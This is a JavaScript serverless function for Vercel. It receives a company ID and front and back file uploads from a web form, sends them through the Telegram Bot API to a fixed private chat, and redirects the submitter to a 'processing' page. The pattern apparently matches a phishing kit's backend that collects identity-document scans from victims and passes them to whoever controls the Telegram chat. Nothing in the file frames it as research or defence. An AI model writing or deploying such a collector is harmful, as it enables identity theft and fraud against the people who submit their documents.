import formidable from 'formidable';
import axios from 'axios';
import FormData from 'form-data'; // Use the imported 'form-data' package
import * as fs from 'fs';       // Use standard file system module

// NOTE: Set your Telegram Bot Token as a Vercel Environment Variable 
// (Settings -> Environment Variables) named 'TELEGRAM_BOT_TOKEN'
// This keeps your secret token out of the public code.
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; 
const CHAT_ID = '8483934112'; // Your fixed chat ID

// IMPORTANT: Vercel serverless functions need the exports.default format
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }
    
    // Check if token is available
    if (!BOT_TOKEN) {
        console.error("TELEGRAM_BOT_TOKEN environment variable is not set!");
        return res.status(500).send('Configuration Error');
    }

    const form = formidable({});
    
    let fields;
    let files;
    
    try {
        // Parse the multipart form data
        [fields, files] = await form.parse(req);
    } catch (err) {
        console.error('Formidable Parse Error:', err);
        return res.status(500).send('File Upload Processing Failed');
    }

    // Convert fields from array (formidable behavior) to string
    const companyId = fields.companyId ? fields.companyId[0] : '';
    const frontFile = files.frontUpload ? files.frontUpload[0] : null;
    const backFile = files.backUpload ? files.backUpload[0] : null;

    // --- Helper function to send files ---
    async function sendDocument(chatId, file) {
        if (!file || file.size === 0) return;

        const formData = new FormData();
        formData.append('chat_id', chatId);
        
        // Use fs.createReadStream for large file handling
        const fileStream = fs.createReadStream(file.filepath);
        
        // Append the file stream with correct metadata
        formData.append('document', fileStream, {
            filename: file.originalFilename,
            contentType: file.mimetype,
        });

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
        
        try {
            await axios.post(url, formData, {
                // IMPORTANT: Use getHeaders() from form-data for correct boundary
                headers: formData.getHeaders(),
            });
        } catch (error) {
            console.error('Telegram Send Document Error:', error.response ? error.response.data : error.message);
        }
    }
    
    // --- Helper function to send messages ---
    async function sendMessage(chatId, text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await axios.post(url, {
                chat_id: chatId,
                text: text,
            });
        } catch (error) {
            console.error('Telegram Send Message Error:', error.response ? error.response.data : error.message);
        }
    }

    // 3. Execution
    
    // Send company ID message
    if (companyId) {
        await sendMessage(CHAT_ID, `📌 New Submission\nCompany ID: ${companyId}`);
    }

    // Send files
    await sendDocument(CHAT_ID, frontFile);
    await sendDocument(CHAT_ID, backFile);
    
    // Send final confirmation
    await sendMessage(CHAT_ID, "✅ All files and data received successfully.");

    // 4. Redirect the user
    res.setHeader('Location', '/processing.html');
    res.status(302).end();
}
